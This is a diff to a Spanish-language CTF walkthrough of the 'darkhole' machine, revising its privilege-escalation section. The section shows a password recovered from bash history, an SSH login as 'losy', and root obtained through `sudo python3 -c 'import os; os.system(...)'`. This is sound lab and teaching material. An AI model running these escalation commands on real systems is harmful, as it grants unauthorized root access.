@@ -151,26 +151,37 @@ Dentro, el usuario es `losy` y su flag está en el directorio personal:
 ## Escalada de privilegios
 
 La shell de la reverse no es una terminal completa: no hay TTY, así que `sudo` no funciona desde
-ahí. Para escalar hay que abrir una sesión SSH real con la cuenta de `losy`, y su contraseña estaba
-en el historial de comandos del sistema (`.bash_history`): alguien ejecutó un comando con la
-contraseña a la vista y quedó guardada en el fichero.
+ahí. Para escalar hay que abrir una sesión SSH real con `losy`, y la contraseña de esa cuenta estaba
+en el **historial de comandos** del sistema. Además, el historial deja escrita la propia ruta de
+escalada: `sudo python3 -c 'import os; os.system("/bin/sh")'` y `sudo su`.
 
-> El `cat` del historial no aparece en la grabación, así que no hay captura de ese momento: lo
-> cuento porque fue parte del camino. **La escalada completa sí está grabada** y son las dos
-> capturas siguientes: el `sudo -l` que autoriza Python (1:46) y la sesión de root con la flag (1:49).
+![El historial de comandos: la contraseña y la ruta de escalada, a la vista](evidencia/historial-bash.png)
 
 ```bash
 ssh losy@<IP-objetivo>
+```
 
+![Entrada por SSH con la cuenta de losy](evidencia/ssh-losy.png)
+
+Con una terminal real, `sudo -l` confirma el permiso y Python hace el resto:
+
+```bash
 sudo -l
 # User losy may run the following commands on darkhole:
 #     (root) /usr/bin/python3
-sudo python3
->>> import os; os.system('bash')
-root@darkhole:/root# cat root.txt
+sudo python3 -c 'import os; os.system("/bin/sh")'
+# whoami
+root
 ```
 
-Una línea de Python y control total. Técnica: T1548.003 (Sudo) · T1059.006 (Python).
+![De losy a root con una línea de Python](evidencia/escalada-python.png)
+
+También vale abriendo el intérprete y ejecutándolo dentro:
+
+```bash
+sudo python3
+>>> import os; os.system('bash')
+```
 ![sudo -l: la cuenta puede ejecutar Python como root](evidencia/sudol.png)
 
 ![Flag de root en /root/root.txt](evidencia/flag.png)
